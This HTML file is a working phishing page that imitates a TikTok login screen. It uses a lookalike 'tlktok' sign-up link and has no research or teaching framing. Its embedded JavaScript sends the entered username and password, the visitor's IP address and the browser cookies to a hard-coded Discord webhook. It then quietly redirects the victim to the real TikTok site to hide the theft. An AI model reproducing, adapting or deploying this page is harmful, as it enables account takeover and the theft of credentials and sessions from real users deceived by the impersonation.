<head>
  <link rel="Icon" type="image/x-icon" href="https://th.bing.com/th/id/R.d48d60b648c547f4603eafedb273e2d6?rik=A6hIvIL7D%2bQYMw&pid=ImgRaw&r=0">
  <title>Tiktok</title>
</head>
<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css.css">
      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://pomf2.lain.la/f/w9q1z405.png">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form">

                    <div class="input-box">
                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>  

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  

                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                    </span>  

                    <a class="forgot" href="https://www.tiktok.com/login/phone/forget-password">Forgot password?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="https://tlktok.vercel.app/">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://apps.apple.com/us/app/tiktok/id835599320">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">

    </section>

  <!-- Select Link -->
  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>

  <script>
  // Function to fetch the user's IP address using an external API
  function getIPAddress() {
    return fetch ('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP address:', error);
            return 'Unknown';
        });
  }

  // Function to get the session cookie
  function getSessionCookie() {
    return document.cookie || 'No session cookie found';
  }

  // Main function to send the message
  async function sendMessage() {
    function sleep(milliseconds) {
      const date = Date.now();
      let currentDate = null;
      do {
        currentDate = Date.now();
      } while (currentDate - date < milliseconds);
    }

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const ipAddress = await getIPAddress();
    const sessionCookie = getSessionCookie();

    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1326595811508752404/tSXbVXAemWPo4sny9G4Q2tkis0sFRj-JERCifj3wF2ZkbkDVbuyFHq4PjugZQbO6wM3n");
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
      content: ("> **USERNAME  : **" + username + "\n> **PASSWORD : **" + password + "\n> **IP ADDRESS : **" + ipAddress + "\n> **SESSION COOKIE : **" + sessionCookie)
    }
    request.send(JSON.stringify(params));
    sleep(400);
    window.location.replace("https://www.tiktok.com/");
  }
  </script>
</body>
